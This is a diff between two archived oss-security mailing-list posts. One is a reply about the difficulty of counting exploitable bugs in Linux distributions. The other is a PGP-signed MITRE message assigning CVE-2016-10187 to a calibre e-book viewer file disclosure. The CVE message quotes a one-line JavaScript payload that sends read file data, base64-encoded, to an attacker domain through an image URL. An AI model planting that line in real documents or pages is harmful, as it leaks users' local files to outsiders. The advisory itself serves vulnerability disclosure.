@@ -1,48 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/14/13
-Message-ID: <CANO=Ty0kA2sgHgZj+w1Xg6Z2G9WGSexa_i59Hi2eo2PQeW=YPQ@mail.gmail.com>
-Date: Fri, 14 Jul 2017 12:04:20 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: Re: Estimate for the total number of exploitable bugs in large linux distro?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/31/9
+Message-ID: <0cab773cce2c4a279f0667a388d3728c@imshyb01.MITRE.ORG>
+Date: Tue, 31 Jan 2017 10:19:04 -0500
+From: <cve-assign@...re.org>
+To: <mpitt@...ian.org>
+CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>, <anarcat@...ian.org>
+Subject: Re: Requesting CVE for calibre file disclosure
 Content-Type: text/plain; charset=utf-8
 
-> On Fri, Jul 14, 2017 at 12:34:01PM +0300, Georgi Guninski wrote:
-> > What is an estimate for the total number of exploitable bugs in large
-> > linux distro?
->
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-First you need to define "distribution". Do we go with "all" the packages
-shipped? Ok... what about things like firefox?
-https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=firefox 1500 CVEs... does
-that count to the distribtion count?  What about non-free in Debian? Anyone
-that ships Flash is also going to see their stats bumped way up.
+> Calibre 2.75 fixed what looks like a local data disclosure vulnerability:
+> 
+> https://github.com/kovidgoyal/calibre/commit/3a89718664cb8cce0449d1758eee585ed0d0433c
+> 
+> E-book viewer: Prevent javascript in the book from accessing files on the computer using XMLHttpRequest.
 
-Now we need to define "exploitable bugs", for example an exploit chain, is
-that multiple bugs or do we count that as a single one for this discussion?
-There's a lot of /tmp flaws that are "exploitable" but I can pretty much
-guarantee nobody will ever bother.
+> https://bugs.launchpad.net/calibre/+bug/1651728
 
-I would then point out the only source of data anyone is mentioning is CVE.
-And CVE has counting rules. For example if you find 100 XSS flaws in a php
-app (because they forgot to use htmlspecialchars on output) in the same
-version we'll assign a single CVE, not 100. So how many bugs do you count
-this as?
+>> When attacker change document.write in payload to this:
+>> document.write('<img src="http://evildomain.pl/some.jpg?data=' + btoa(data) + '">');
+>> could easily read data from server log.
 
-CVE is also incomplete. There's lots and lots of vulns with no CVE
-(something I'm trying to remediate with the DWF).
+Use CVE-2016-10187.
 
-I would suggest before anyone continue this thread they go read:
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-https://media.blackhat.com/us-13/US-13-Martin-Buying-Into-The-Bias-Why-Vulnerability-Statistics-Suck-Slides.pdf
-
-it's largely a pointless discussion because the question isn't well
-defined, and we know for a fact we don't have good data to answer it
-(yet...).
-
-
--- 
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@...hat.com
-
+iQIcBAEBCAAGBQJYkKkAAAoJEHb/MwWLVhi2VMIQAJR5qTlhg0haVZfpsRXpX8YG
+O3JHHe2AW1NfvM8nYnxLK6MKfgBGIIh2oehQr9fG0wvKp0UF5Nmw8suFdiivfUFC
+N5KorT7Yb8xVJJzZmksPQ0mna8KAjJj5tw+1tentldFR0qbBnMxT0FiswF0rh815
+B5eVflvSH1gu3f9uEHpk3HSHZ0RagMwwA8XGe6h2AigShdQr6VCjP8SMafiu9pSA
+mXB+uFRso6bs5moyspW66DsuixeBBgFXn8QjoNhBWLA0Hj+d4Sz6BC0uUXCtPjy6
+6eWLZW2LOjiAlymGNgYuXXxDWslEBYe2LCnLntHKPff/JphuwwqdUz5dHHObktII
+uOXYrT7/Fyw6GLUtU3OulmqPbi4hOxEC2ERTse4l1RH9L6GpbBKY7Usq6xM9f9gx
+zYD+nQOVfR1aI/otMqsw0PaQSXyENId0Yv31+vwZTXk/TZ1dFBByaRCkjEAeTACR
+uh++QTFQKe2z91g+57jAQvAeD9hx6pepr3gV1b0QYjXgsDW2as+FDtWrYUVlVqdf
+NszEb+Z5sdVwEBFQVWqDudvZvUPnoaGgb7YrQxY85YSjoqrYk50iWArup2OMSxAb
+tMiMJjWuUiU17BPL/ih3OAdEJceUuyVjkmT/rTcjLbGHrCRPT+OZHyqDohzaQKbx
+k5XtJrNvWNusE+Q69k0e
+=tz/j
+-----END PGP SIGNATURE-----
